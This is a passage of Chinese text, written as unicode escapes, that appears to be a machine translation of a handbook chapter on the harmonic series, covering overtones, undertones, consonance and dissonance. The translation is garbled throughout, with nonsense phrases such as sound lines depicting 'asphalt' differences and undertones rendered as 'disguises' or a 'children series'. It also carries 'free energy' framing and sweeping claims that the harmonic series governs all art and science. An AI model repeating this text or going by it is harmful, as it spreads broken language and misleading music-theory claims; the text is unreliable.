\u867d\u7136Kayser\u7684\u5de5\u4f5c\u5305\u542b\u4e86\u4e8c\u7ef4\u5bf9\u6570\u6784\u9020\u548c\u4e09\u7ef4\u7ebf\u6027\u7684\uff0c\u4f46\u4ed6\u4ece\u672a\u5c06\u5b83\u4eec\u52a0\u5165\u4e09\u7ef4\u5bf9\u6570\u77e9\u9635 - \u81f3\u5c11\u636e\u6211\u6240\u77e5\u3002\u4ed6\u4e5f\u4ece\u672a\u4ece\u8282\u594f\u6216\u8282\u594f\u7684\u65f6\u95f4\u89c6\u89d2\u770b\u7740\u4e0b\u964d\u7684\u4e92\u60e0\uff0c\u4ed6\u7684\u5de5\u4f5c\u4ecd\u7136\u9650\u4e8e\u97f3\u8c03\u7684\u97f3\u8c03\u9886\u57df\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u4ed6\u5c06\u8c10\u6ce2\u7814\u7a76\u5230\u6781\u7aef\uff0c\u5e76\u5728\u4e3b\u9898\u4e0a\u5199\u4e86\u4e00\u751f\u7684\u7ec8\u8eab\u4e66\u7c4d\u3002 8.\n  \u4e8b\u5b9e\u8bc1\u660e\uff0c\u5728\u6211\u4e4b\u524d\u81f3\u5c11\u6709\u4e00\u4e2a\u4eba\u72ec\u7acb\u53d1\u73b0\u4e86\u76f8\u540c\u7684\u4e00\u90e8\u5206\uff08\u4e0e\u8c10\u6ce2\u76f8\u5173\uff09\u7684\u57fa\u672c\u6982\u5ff5\uff0c\u5e76\u786e\u8ba4\u5e76\u52a0\u5f3a\u4e86\u6211\u81ea\u5df1\u7684\u5de5\u4f5c\u3002\u57fa\u4e8e\u8fd9\u4e00\u4e8b\u5b9e\u7684\u5de5\u4f5c\uff0c\u5373\u89c6\u89c9\u611f\u77e5\u662f\u6700\u5438\u6536\u7684\u7406\u89e3\u65b9\u6cd5\uff0c\u4e5f\u8bb8\u662f\u5b66\u4e60\u770b\u4e0d\u89c1\u7684\u552f\u4e00\u7684\u58f0\u97f3\u5173\u7cfb\u4e16\u754c\u7684\u6b63\u786e\u65b9\u6cd5\u3002\n  \u672c\u6587\u662f\u201c\u771f\u6b63\u7684\u97f3\u4e50\u771f\u6b63\u7684\u97f3\u4e50\uff1a3\u4e2aRD\u5343\u5e74\u97f3\u4e50\u5bb6\uff0c\u7cbe\u795e\u4e0a\u5bfb\u6c42\u8005\u548c\u81ea\u7531\u80fd\u6e90\u53d1\u73b0\u8005\u624b\u518c\u201d\u7684\u4e00\u90e8\u5206\u3002\u8fd9\u91cc\u5448\u73b0\u7684\u4fe1\u606f\u867d\u7136\u4ee5\u975e\u5e38\u7b80\u5355\u548c\u975e\u5e38\u76f4\u89c2\u7684\u65b9\u5f0f\uff0c\u4f46\u5728\u539f\u59cb\u4e0a\u4e0b\u6587\u4e2d\u53d6\u51fa\u65e0\u8f9c\u97f3\u4e50\u7231\u597d\u8005\u7684\u4ef7\u503c\u53ef\u80fd\u5f88\u5c0f\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5728\u7ee7\u7eed\uff0c\u5047\u8bbe\u8bfb\u8005\u5728\u5b8c\u6574\u6027\u4e2d\u6709\u5173\u4e8e\u771f\u6b63\u7684\u8c10\u6ce2\u7cfb\u5217\u7684\u4e86\u89e3\uff1a\u5b83\u771f\u7684\u662f\u4ec0\u4e48\uff0c\u5b83\u53ef\u4ee5\u5728\u81ea\u7136\u754c\u4e2d\u627e\u5230\uff0c\u4ee5\u53ca\u5982\u4f55\u5c06\u4e0d\u540c\u7684\u8c10\u6ce2\u9694\u79bb\uff0c\u5e76\u5728\u5141\u8bb8\u5b83\u7684\u4eea\u5668\u4e0a\u5f3a\u8c03\u4e0d\u540c\u7684\u8c10\u6ce2;\u6b64\u5916\uff0c\u8bfb\u8005\u5f88\u597d\u5730\u719f\u6089\u201c\u97f3\u4e50\u80cc\u540e\u7684\u6570\u5b66\u201d\u3002 \n\u53ea\u8981\u5728\u6b64\u5c06\u4f7f\u7528\u672f\u8bed\u201c\u8c10\u6ce2\u7cfb\u5217\u201d\uff0c\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u5b83\u6697\u793a\u4e86\u4e0a\u5347\u548c\u964d\u5e8f\u3002\u6bcf\u5f53\u4f7f\u7528\u672f\u8bed\u201c\u8c10\u6ce2\u201d\u65f6\uff0c\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u5b83\u6697\u793a\u4e86Supra-\u8c10\u6ce2\uff08\u6765\u81ea\u5347\u9ad8\u7684\u7cfb\u5217\uff09\u548c\u5b50\u8c10\u6ce2\uff08\u4ece\u4e0b\u964d\u9636\u5c42\u7684\u8c10\u6ce2\u6216\u8c10\u6ce2\uff09\uff0c\u9664\u975e\u53e6\u6709\u8bf4\u660e\u3002\u8fd9\u4e9b\u662f\u7b80\u5355\u7684\u97f3\u8c03\uff1a\u58f0\u97f3\u7684\u8868\u73b0\u4e3a\u6700\u7eaf\u7cb9\u7684\u5f62\u5f0f\uff0c\u5b8c\u5168\u968f\u7740\u5b83\u4eec\u5728\u590d\u6742\u7684\u97f3\u8c03\u5185\u51fa\u73b0\u7684\u5b8c\u5168\u51fa\u73b0\uff0c\u5e76\u4e14\u5728\u6574\u4e2a\u5de5\u4f5c\u4e2d\u7684\u4f7f\u7528\u662f\u4ee5\u7cbe\u786e\u7684\u6570\u503c\u5f62\u5f0f\u6697\u793a\u7684\u3002\u5b8c\u5168\u6392\u9664\u4f7f\u7528\u6c14\u8d28\u6216\u5176\u4ed6\u4eba\u5de5\u89c2\u548c\u8fd1\u4f3c\u3002\n  \u8fd9\u91cc\u63d0\u51fa\u7684\u6240\u6709\u6bd4\u7387\u90fd\u6307\u7684\u662f\u7b80\u5355\u7684\u58f0\u97f3\u97f3\u8c03\u3002\u7ed3\u679c\u8868\u660e\uff0c\u4ece\u8fd9\u4e9b\u7b80\u5355\u7684\u97f3\u8c03\u4ea7\u751f\u590d\u6742\u7684\u97f3\u8c03\uff0c\u5982\u8fdb\u4e00\u6b65\u5448\u73b0\u7684\u6982\u5ff5\u77e9\u9635\u6240\u793a\u3002\u901a\u8fc7\u6269\u5c55\uff0c\u8fd9\u4e9b\u8c10\u6ce2\u53ef\u7528\u4f5c\u5e94\u7528\u4e8e\u590d\u5408\u97f3\u8c03\u7684\u5b9e\u9645\u8c03\u8c10\u7cfb\u7edf\u7684\u6a21\u677f\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u53ea\u662f\u4ed6\u4eec\u5728\u8ba1\u7b97\u4e2d\u8003\u8651\u7684\u6839\u672c\uff0c\u800c\u4ed6\u4eec\u5404\u81ea\u7684\u8c10\u6ce2\u7cfb\u5217\u88ab\u6697\u793a\u4e3a\u4e0e\u6574\u4f53\u57fa\u672c\uff08\u7406\u6027\uff0c\u6574\u6570\uff09\u6570\u5173\u7cfb\u76f8\u5173\u7684\u3002\n    \u97f3\u4e50\u754c\uff0c\u8c10\u6ce2\u7cfb\u5217\u662f\u5927\u81ea\u7136\u7684\u5355\u4e00\u5b8c\u7f8e\u8c03\u6574\u7cfb\u7edf\u548c\u8282\u594f\u6a21\u5f0f\u3002\u6839\u636e\u5168\u7403\u96c7\u7528\u7684\u5927\u591a\u6570\u6587\u5316\u8c03\u8282\u548c\u8282\u594f\u662f\u6839\u636e\u4efb\u610f\u793e\u4f1a\u7ed3\u6784\u5236\u5b9a\u7684\uff0c\u662f\u97f3\u4e50\u793e\u4f1a\u8c03\u7406\u7684\u4e3b\u89c2\u7ecf\u9a8c\u7684\u4e00\u90e8\u5206\u3002\u8bb8\u591a\u4eba\u57fa\u4e8e\u771f\u6b63\u7684\u8c10\u6ce2\u7cfb\u5217\uff0c\u5e76\u7528\u4e0d\u89c4\u5219\u7f3a\u5c11\u7684\u6210\u5458\u4ee3\u8868\u5b83\u7684\u9065\u8fdc\u7684\u5207\u7247\u3002\u5176\u4ed6\u4eba\u50cf\u6c14\u8d28\u4e00\u6837\u5b8c\u5168\u662f\u4eba\u4e3a\u7684\uff0c\u5c3d\u7ba1\u4efb\u4f55\u4e8b\u60c5\u90fd\u8bd5\u56fe\u8ba9\u5b83\u4eec\u770b\u8d77\u6765\u50cf\u81ea\u7136\u8c10\u6ce2\u7684\u6269\u5c55\u3002\u4e0d\u5305\u62ec\u76f8\u7b49\u548c\u4e0d\u5e73\u7b49\u7684\u901f\u5ea6\uff0c\u57fa\u4e8eRational Numbers\u7684\u4efb\u4f55\u5176\u4ed6\u53ef\u60f3\u5230\u7684\u8c03\u6574\uff08\u4ee5\u53ca\u5b83\u4eec\u7684\u7ea7\u5206\u5f62\u5f0f\u7684\u7ec4\u5408\uff09\u53ef\u4ee5\u8ffd\u6eaf\u5230\u8fd9\u91cc\u5448\u73b0\u7684\u77e9\u9635\u5185\u7684\u56fe\u6848\u3002\n  \u6570\u5b66\u4e0a\uff0c\u8c10\u6ce2\u7cfb\u5217\u662f\u5927\u81ea\u7136\u5173\u7cfb\u89c4\u5f8b\u7684\u516c\u5f0f\u3002\u8fd9\u4e9b\u6cd5\u5f8b\u5e76\u6ca1\u6709\u4ec5\u5728\u97f3\u4e50\u4e2d\u53cd\u6620\uff0c\u4f5c\u4e3aTimbre\uff0c\u8282\u594f\u548c\u97f3\u9ad8\u7684\u8c10\u6ce2\u7684\u6210\u56e0\uff0c\u4f5c\u4e3a\u8c10\u6ce2\u4e4b\u95f4\u7684\u58f0\u97f3\u8ddd\u79bb\uff0c\u97f3\u8c03\u4e4b\u95f4\u7684\u9891\u7387\u548c\u5c3a\u5bf8\u6bd4\u4f8b\u7684\u8eab\u4f53\u7684\u5c3a\u5bf8\uff0c\u800c\u4e14\u8fd8\u5728\u4f7f\u7528\u4e2d\u7684\u6240\u6709\u6570\u5b57\u548c\u6570\u5b57\u7cfb\u7edf\u4e2d\uff0c\u5982\u771f\u6b63\u7d20\u6570\u7684\u6a21\u5f0f\uff0c\u5efa\u7b51\u548c\u89c6\u89c9\u827a\u672f\u7684\u51e0\u4f55\u5f62\u72b6\u4e2d\u56fa\u6709\uff0c\u5728\u4e09\u89d2\u6838\u5fc3\uff0c\u5728\u5f69\u8679\u7684\u989c\u8272\uff0c\u4e00\u822c\u90fd\u5728\u6240\u6709\u827a\u672f\u548c\u79d1\u5b66\u4e2d\u3002\n    \u4e0a\u5347\u7684\u8c10\u6ce2\u7cfb\u5217\u5782\u76f4\u7ed8\u5236\u5728\u201c\u4f60\u770b\u5230\u7684\u662f\u4f60\u542c\u5230\u7684\u201d\u9891\u7387\u611f\u77e5\u7ebf\u4e0a\u7684\u201c\u4ec0\u4e48 - \u4f60\u770b\u5230\u7684\u201d\u9891\u7387\u611f\u77e5\u7ebf\u4e0a\uff0c\u4f20\u8fbe\u672c\u7cfb\u5217\u7684\u5206\u8fa8\u7387\u3002\u8fd9\u7b80\u5355\u610f\u5473\u7740\u6240\u6709\u6cdb\u97f3\u7ec4\u4ef6\u90fd\u9002\u5408\u5728\u6839\u672c\u5185\uff0c\u4e5f\u53ef\u4ee5\u5f7c\u6b64\u9002\u5408 - \u53ea\u8981\u76f8\u540c\u7684\u57fa\u672c\u4ecd\u7136\u662f\u4ed6\u4eec\u7684\u5171\u540c\u53c2\u8003\u3002\n    \u58f0\u97f3\u53f7\u7ebf\u63cf\u7ed8\u4e86\u6ca5\u9752\u7684\u5dee\u5f02\uff0c\u56e0\u4e3a\u5b83\u4eec\u88ab\u4eba\u8111\u88ab\u611f\u77e5\u548c\u89e3\u91ca\u3002\u8fd9\u4e9b\u6570\u5b57\u4ee3\u8868\u9891\u7387\u4e58\u6cd5\u5668\uff0c\u4e0e\u7edd\u5bf9\u57fa\u5e95\uff08\u7b2c\u4e8c\u4e2a\u6b21\u8c10\u6ce2\u00d72\u76f8\u5173\u7684\u9891\u7387\u500d\u589e\u5668\u6709\u5173\u7684\u9891\u7387\u9ad8\u4e8e\u57fa\u672c\u57fa\u5e951; Supra-Harmonic\u00d73\u58f0\u97f3\u9ad8\u4e8e1\uff0c\u7b49\u7b49\uff09\u3002\u632f\u8361\u4e32\u7684\u8f6e\u5ed3\u4ee3\u8868\u4e86\u6bcf\u4e2a\u8c10\u6ce2\u7684\u58f0\u97f3\u4ea7\u751f\u6e90\u7684\u5b9e\u9645\u7269\u7406\u5c3a\u5bf8\u3002\n  \u5782\u76f4\u5e03\u7f6e\u8fd8\u610f\u5473\u7740\u53ef\u4ee5\u540c\u65f6\uff08\u540c\u65f6\uff09\u540c\u65f6\u64ad\u653e\u4efb\u4f55\u6216\u6240\u6709\u7684Supra-\u8c10\u6ce2\uff0c\u6240\u4ee5\u7531\u8033\u6735\u88ab\u89c6\u4e3a\u548c\u8c10\u8f85\u97f3\u6240\u4ea7\u751f\u7684\u58f0\u97f3\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8f85\u97f3\u548c\u8c10\u7684\u5b9a\u4e49\uff1a\u9891\u7387\u662f\u6574\u6570\u7684\u7b80\u5355\u97f3\u8c03\uff0c\u57fa\u672c\u7684\u500d\u6570\uff0c\u5e76\u4e0e\u57fa\u672c\u7684\u540c\u65f6\u4f7f\u7528\u3002 \n\u8fd9\u4e2a\u5b9a\u4e49obeys\u4e00\u4e2a\u89c4\u5219\uff1a\u5728\u4e00\u8d77\u64ad\u653e\u65f6\uff0c\u4efb\u4f55\u6570\u91cf\u7684\u6cdb\u97f3\u90fd\u662f\u548c\u8c10\u8f85\u97f3\uff0c\u53ea\u8981\u57fa\u672c\u7684\u6839\u672c\u4e5f\u542c\u8d77\u6765\u5f88\u54cd\u8d77\u3002\u5f53\u6839\u672c\u4e0d\u5b58\u5728\u65f6\uff0c\u6211\u4eec\u63d0\u5347\u8fdb\u4e00\u6b65\uff0c\u8d8a\u4f4e\u7684\u611f\u77e5\u548c\u8c10\u3002\u4f8b\u5982\uff0c\u58f0\u97f3\u540c\u4e0a\uff0c\u8c10\u6ce22\u548c3\u5c06\u6bd4\u542c\u8d77\u6765\u66f4\u52a0\u4ee4\u4eba\u6109\u60a6\uff0c\u800c\u4e0d\u662f\u542c\u8d77\u6765\u540c\u4e0a\u8c10\u6ce28\u548c9.\uff08\u4f46\u5982\u679c\u6211\u4eec\u5c06\u57fa\u672c1\u4ecb\u7ecd\u5230\u56fe\u7247\u4e2d\uff0c\u90a3\u4e488\u548c9\u5c06\u5b8c\u5168\u89e3\u51b3\u5b83\u7ed9\u4e86\u8f85\u97f3\u548c\u8c10\u7684\u611f\u89c9\u3002\uff09\n  \u8fd9\u4e9bSupra-\u8c10\u6ce2\u662f\u7b80\u5355\u7684\u97f3\u8c03\u3002\u64ad\u653e\u5b83\u4eec\u5728\u4e00\u8d77\u521b\u5efa\u4e00\u4e2a\u590d\u5408\uff08\u6216\u590d\u6742\u7684\uff09\u97f3\u8c03\uff0c\u4ee5\u53caMICBRE\u7684\u6df7\u5408\u8d26\u6237\u4e2d\u7684\u6bcf\u4e2a\u6cdb\u97f3\u7684\u7279\u5b9a\u97f3\u91cf\uff08\u5f3a\u5ea6\u6216\u529f\u7387\uff09\uff1a\u5f53\u4e24\u4e2a\u4eea\u5668\u64ad\u653e\u65f6\uff0c\u4f7f\u94a2\u7434\u58f0\u97f3\u4e0eSITAR\u4e0d\u540c\u7684\u94a2\u7434\u58f0\u97f3\uff08\u5316\u5408\u7269\uff09\u8272\u8c03\u5177\u6709\u76f8\u540c\u9891\u7387\u7684\u6839\u672c\u632f\u52a8\u3002\u8fd9\u4e5f\u5360\u4e86\u4e24\u4e2a\u4eba\u58f0\u660e\u7684\u5dee\u5f02\uff0c\u6302\u7ed9\u540c\u6837\u7684\u5143\u97f3\uff0c\u4ee5\u53ca\u540c\u4e00\u4e2a\u4eba\u541f\u5531\u7684\u4e0d\u540c\u5143\u97f3\u4e4b\u95f4\u7684\u5dee\u5f02 - \u6240\u6709\u6761\u4ef6\u90fd\u5728\u76f8\u540c\u7684\u6761\u4ef6\u4e0b\uff1a\u5b83\u4eec\u7684\u57fa\u672c\u9762\u5177\u6709\u76f8\u540c\u7684\u9891\u7387\u3002\n   overtones\u4e5f\u53ef\u4ee5\u8fde\u7eed\u64ad\u653e\uff0c\u4f46\u8ba9\u6211\u4eec\u7559\u4e0b\u8fd9\u4e00\u8fb9\uff0c\u4ee5\u4fbf\u73b0\u5728\u575a\u6301\u57fa\u7840\u3002\n    \u4e0b\u884c\u8c10\u6ce2\u7cfb\u5217\u6c34\u5e73\u5730\u7ed8\u5236\u5728\u201c\u4ec0\u4e48 - \u4f60\u770b\u5230\u7684\u662f\u4f60\u542c\u5230\u7684\u201d\u9891\u7387\u611f\u77e5\u7ebf\u4e0a\u7684\u201c\u9891\u7387\u611f\u77e5\u201d\uff0c\u4ee5\u4f20\u8fbe\u6240\u6709\u5728\u6240\u6709\u4f2a\u9020\u7684\u7ec4\u4ef6\u5185\u5b8c\u5168\u9002\u5408\u7684\u4e8b\u5b9e\uff08\u53cd\u8fc7\u6765\u4e0d' T\u59cb\u7ec8\u76f8\u4e92\u914d\u5408\uff09\u3002\n    \u58f0\u97f3\u53f7\u7ebf\u63cf\u7ed8\u4e86\u6ca5\u9752\u7684\u5dee\u5f02\uff0c\u56e0\u4e3a\u5b83\u4eec\u88ab\u4eba\u8111\u88ab\u611f\u77e5\u548c\u89e3\u91ca\u3002\u8fd9\u4e9b\u6570\u5b57\u4ee3\u8868\u5206\u9891\u5668\uff0c\u4e0e\u7edd\u5bf9\u57fa\u7840\uff08\u7b2c\u4e8c\u6b21\u8c10\u6ce2\u00f72\u6709\u5173\u7684\u9891\u7387\u4f4e\u4e8e\u57fa\u672c1\u7684\u9891\u7387;\u526f\u8c10\u6ce2\u00f73\u58f0\u97f3\u6bd41\u66f4\u6df1\u76843\u500d\uff0c\u7b49\u7b49\uff09\u3002\u632f\u8361\u4e32\u7684\u8f6e\u5ed3\u4ee3\u8868\u4e86\u6bcf\u4e2a\u8c10\u6ce2\u7684\u58f0\u97f3\u4ea7\u751f\u6e90\u7684\u5b9e\u9645\u7269\u7406\u5c3a\u5bf8\u3002\u8fd9\u4e9b\u5e45\u5ea6\uff08\u529f\u7387\uff0c\u4f53\u79ef\uff09\u672a\u6b63\u786e\u63cf\u8ff0\u3002\n  \u6c34\u5e73\u5e03\u7f6e\u4e5f\u610f\u5473\u7740\u53ef\u4ee5\u8fde\u7eed\u5730\u64ad\u653e\u4efb\u4f55\u6216\u6240\u6709\u5b50\u8c10\u6ce2\uff08\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\uff09\uff0c\u6240\u5f97\u5230\u7684\u65cb\u5f8b\u88ab\u79f0\u4e3a\u97f3\u4e50\u6709\u6548\u7684\u542c\u89c9\u611f\u77e5\u3002\u7136\u800c\uff0c\u5982\u679c\u540c\u65f6\u64ad\u653e\u4e24\u79cd\u4ee5\u4e0a\uff0c\u5219\u5f97\u5230\u7684\u590d\u5408\u58f0\u97f3\u5c06\u88ab\u89c6\u4e3a\u548c\u8c10\u5206\u6563\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u5b9e\u9645\u4e0a\u662f\u5f02\u89e3\u548c\u548c\u8c10\u7684\u5b9a\u4e49\uff1a\u9891\u7387\u662f\u57fa\u672c\u57fa\u672c\u7684\u6574\u6570\u5b50\u500d\u6570\u7684\u7b80\u5355\u97f3\u8c03\uff0c\u5e76\u4e0e\u57fa\u672c\u540c\u65f6\u4f7f\u7528\u3002\n  \u4f5c\u4e3a\u4fa7\u9762\u8bf4\u660e\uff0c\u901a\u8fc7\u540c\u65f6\u53d1\u51fa\u4e0d\u4e0e\u81ea\u5df1\u66f2\u8c03\u7684\u590d\u6742\u97f3\u8c03\u7684\u540c\u65f6\u53d1\u51fa\u54cd\u5e94\u800c\u4ea7\u751f\u7684\u975e\u8c10\u6ce2\u89e3\u6563\u6216\u5931\u8c03\u3002\u8fd9\u53ea\u662f\u610f\u5473\u7740\u4efb\u4f55\u6570\u91cf\u7684\u590d\u6742\u97f3\u8c03\uff0c\u5176\u57fa\u672c\u9891\u7387\u4e0d\u4f1a\u5448\u73b0\u76f4\u63a5\u4ece\u81ea\u5df1\u7684\u8c10\u6ce2\u7cfb\u5217\u91c7\u53d6\u7684\u5173\u7cfb\uff0c\u5f53\u4e00\u8d77\u64ad\u653e\u65f6\u4f1a\u542c\u8d77\u6765\u3002\u8fd9\u662f\u56e0\u4e3a\u4ed6\u4eec\u7684\u57fa\u672c\u9762\u548c\u5b8c\u6574\u7684\u8c10\u6ce2\u7cfb\u5217\u5c06\u7ed3\u5408\u6210\u975e\u91cd\u590d\u6a21\u5f0f\uff1a\u975e\u8c10\u6ce2\u8fd0\u52a8\u5728\u5b8c\u5168\u540c\u65f6\u91cd\u590d\u76f8\u540c\u7684\u5468\u671f\u3002\u5728\u7269\u7406\u4e0a\uff0c\u8fd9\u8f6c\u5316\u4e3a\u632f\u8361\u5f26\u7684\u8f6e\u5ed3\uff0c\u5176\u4e0d\u5b8c\u5168\u5f7c\u6b64\u5408\u9002\u3002 \n\u6700\u7b80\u5355\u7684\u9891\u7387\u5173\u7cfb\uff08\u6bd4\u7387\uff09\u5360\u6700\u7eaf\u7cb9\u7684\u4e00\u81f4\u7684\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u975e\u5e38\u5927\u7684\u6570\u91cf\u7684\u8c10\u6ce2\u5173\u7cfb\u503e\u5411\u4e8e\u547c\u58f0\u4e0d\u548c\u8c10\u7684\u5dde\u8f83\u9ad8\uff0c\u800c\u4f3c\u4e4e\u6ca1\u6709\u53ef\u62c6\u5378\u7684\uff0c\u4f3c\u4e4e\u5c1a\u672a\u89e3\u6790\u7684\u548c\u7b2c\u56db\u6b21\u5206\u6563\u7531\u5177\u6709\u975e\u91cd\u590d\u548c\u6c38\u4e0d\u7ed3\u675f\u7684\u5c0f\u6570\uff08\u975e\u7406\u6027\u6570\uff09\u4ea7\u751f\u7684\u3002\u5f53\u7136\u5b58\u5728\u53ef\u7591\u7684\u4e0d\u5e94\u5206\u6563\u7a0b\u5ea6\uff0c\u4f46\u6700\u660e\u663e\u7684\u4e8b\u5b9e\u662f\u5927\u8111\u53ef\u4ee5\u5f88\u597d\u5730\u63a5\u53d7\u751a\u81f3\u4eab\u53d7\u8fd9\u4e9b\u89e3\u6563\uff0c\u53ea\u8981\u5b83\u4eec\u662f\u5b83\u66fe\u7ecf\u7ecf\u5386\u8fc7\u7684\u552f\u4e00\u97f3\u4e50\u7684\u4e00\u90e8\u5206\u3002\n  \u4f7f\u7528unltones\u53ef\u4ee5\u6269\u5c55\u5230\u540c\u65f6\u64ad\u653e\uff0c\u4f46\u8fd9\u662f\u4e00\u4e2a\u653e\u5927\u5668\u8c08\u8bdd\u7684\u4e00\u90e8\u5206\uff0c\u5373\u6269\u5927\u7684\u97f3\u4e50\u53ef\u80fd\u6027\uff0c\u76ee\u524d\u4e0d\u4e3a\u6211\u4eec\u94fa\u8bbe\u57fa\u7840\u3002\n    \u6240\u5b9a\u4e49\u7684\u97f3\u4e50\u7684\u5782\u76f4\u548c\u6c34\u5e73\u97f3\u8c03\uff08\u901a\u8fc7\u540c\u65f6\u548c\u8fde\u7eed\u53d1\u51fa\u97f3\u8c03\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ece\u540c\u4e00\u57fa\u7840\u4e0a\u6269\u5c55\u4e24\u4e2a\u5012\u6570\u8c10\u6ce2\u7cfb\u5217\u3002\n    \u5c3d\u7ba1\u73b0\u5b9e\u4e2d\u5ef6\u4f38\u5f97\u591a\uff0c\u4f46\u5728\u6982\u5ff5\u4e0a\u5ef6\u4f38\u5230\u65e0\u9650\u60c5\u51b5\uff0c\u4f46\u5728\u8fd9\u91cc\u53ea\u63cf\u7ed8\u4e86\u524d5\u4e2a\u8c10\u6ce2\uff0c\u4ee5\u4fbf\u6e05\u695a\u8d77\u89c1\u3002\u76f8\u5173\u989c\u8272\u662f\u4efb\u610f\u7684\u3002\n  \u4ece\u57fa\u672c\u4e0a\u6807\u8bb0\u4e3a1\u7684\u56fe\u7247\u53ef\u4ee5\u770b\u51fa\uff0c\u4ece\u5e95\u90e8\u5411\u4e0b\u5782\u76f4\u9010\u6e10\u5347\u9ad8\u5e76\u4e14\u5782\u76f4\u5347\u9ad8\uff0c\u5e76\u4e14\u968f\u7740\u97f3\u8c03\u589e\u52a0\uff0c\u8fd9\u4e9b\u95f4\u9694\u53d8\u5c0f\u548c\u66f4\u5c0f\u7684\u95f4\u9694\u3002\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u79cd\u590d\u5408\u97f3\u7684\u6982\u5ff5\u8868\u793a\uff0c\u5b83\u540c\u65f6\u53d1\u51fa\u57fa\u672c\u548c\u6240\u6709\u5782\u76f4\u8c10\u6ce2\uff08\u5982\u679c\u60a8\u613f\u610f\uff0c\u5219\u5728\u548c\u5f26\u4e2d\uff09\u3002\u5728\u6b64\u56fe\u8868\u4e0a\u672a\u793a\u51fa\u4f53\u79ef\u6216\u5f3a\u5ea6\u3002\n  \u8c10\u6ce2\u7684\u6388\u6743\u7cfb\u5217\u663e\u793a\u4e86\u7cbe\u786e\u7684\u76f8\u53cd\u548c\u5bf9\u79f0\u7684\u7ed3\u6784\u3002\u968f\u7740\u7cfb\u5217\u7684\u8ddd\u79bb\u51cf\u5c0f\uff0c\u6c34\u5e73\u4ece\u53f3\u5230\u5de6\u8fdb\u5c55\uff0c\u95f4\u9694\u53d8\u5c0f\u548c\u66f4\u5c0f\u3002\u5dee\u5f02\u662f\uff0c\u8be5\u7cfb\u5217\u4e0d\u4ee3\u8868\u590d\u5408\u8272\u8c03\u7684\u7ed3\u6784\uff0c\u800c\u662f\u901a\u8fc7\u8fd9\u79cd\u8272\u8c03\u65cb\u5f8b\u65cb\u5f8b\u7684\u6b65\u9aa4\u3002\u8fd9\u610f\u5473\u7740\u6bcf\u4e2a\u4eba\u90fd\u4f1a\u6709\u81ea\u5df1\u7684\u4e00\u7cfb\u5217\u6cdb\u6ee5\u3002\n  \u90a3\u4e48\u8fd9\u5b9e\u9645\u4e0a\u662f\u4ec0\u4e48\u610f\u601d\uff1f\u8fd9\u610f\u5473\u7740\u9891\u7387\u4f1a\u589e\u957f\u6216\u51cf\u5c0f\uff08\u5448\u6307\u6570\u4e0a\uff09\uff0c\u5c06\u5176\u4e58\u4ee5\u6216\u5c06\u5176\u503c\u4e58\u4ee5\u64cd\u4f5c\u5458\uff08\u00d7\u6216\u00f7\u7b26\u53f7\uff09\uff0c\u5e76\u4e14\u59cb\u7ec8\u4e0e\u7cfb\u5217\u7684\u57fa\u7840\u76f8\u5173\u3002\u8bf4\u8fd9\u4e2a\u6839\u672c1\u88ab\u5206\u914d\u7ed9\u6bcf\u5355\u4f4d\u65f6\u95f4300\u4e2a\u4e8b\u4ef6\u7684\u9891\u7387;\u8fd9\u5c06\u4f7f\u00d72\u6cdb\u97f3\u632f\u52a8600\u6b21\uff0c\u00d73\u6cdb\u97f3900\u6b21\uff0c\u800c\u25b32\u7684\u9891\u7387\u4e3a\u6bcf\u5355\u4f4d\u65f6\u95f4\u4e3a150\u4e2a\u4e8b\u4ef6\uff0c\u90a3\u4e48\u00f73\u4f2a\u88c5100\uff0c\u7b49\u7b49\u3002 \n\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\uff0c\u5bf9\u4e8e\u5916\u8fb9\u7f18\u7684\u503c\uff0c\u5373\u4f7f\u6211\u4eec\u5199\u5165\u201c\u00d75\u201d\uff0c\u201c\u00f73\u201d\u7b49\uff0c\u9690\u542b\u7684\u89e3\u91ca\u4e3a\u201c1\u00d75\u201d\uff0c\u201c1\u00f73\u201d\u7b49\u3002\n    \u6bcf\u4e2a\u4eba\u90fd\u5c06\u62e5\u6709\u81ea\u5df1\u7684\u4e00\u7cfb\u5217\u7e41\u591a\uff0c\u7ed3\u6784\u4e0e\u57fa\u672c\u7684\u7ed3\u6784\u76f8\u540c\uff0c\u4f46\u5728\u9891\u7387\u65b9\u9762\u5b8c\u5168\u8f6c\u79fb\u3002\u4f5c\u4e3a\u5b9e\u65bd\u4f8b\uff0c\u7b2c\u4e8c\u4e2a\u4f2a\u88c5\uff0c\u8c03\u6574\u5230\u8be5\u9891\u7387\u7684\u590d\u5408\u97f3\u8d28\u5c06\u5177\u6709\u5176\u81ea\u5df1\u7684\u504f\u79fb\u7cfb\u5217\u7684\u6cdb\u97f3\uff0c\u5982\u4e0b\u6240\u793a\u3002\n    \u8be5\u513f\u7ae5\u7cfb\u5217\u7684\u6bcf\u4e2a\u65b0\u6210\u5458\u7684\u6570\u503c\u7531\u8be5\u7cfb\u5217\u7684\u57fa\u7840\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u7ed9\u51fa\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f\u7b2c\u4e8c\u4e2a\u4f2a\u751f\u548c\u539f\u59cb\u6cdb\u97f3\u7cfb\u5217\u3002\u56fe\u4e2d\u7684\u6bcf\u4e00\u4e2a\u65b0\u523b\u5ea6\u5b9e\u9645\u4e0a\u90fd\u662f\u7531\u5e73\u884c\u6269\u5c55\u548c\u6295\u5f71\u7684\u8ddf\u8e2a\u4ea7\u751f\u7684\u4ea4\u53c9\u70b9\u3002\u6bcf\u4e2a\u65b0\u503c\u90fd\u5c06\u5305\u542b\u4e0e\u5176\u5404\u81ea\u7684\u8fd0\u7b97\u7b26\u5171\u540c\u521b\u5efa\u5b83\u7684\u6570\u5b57\u3002\n  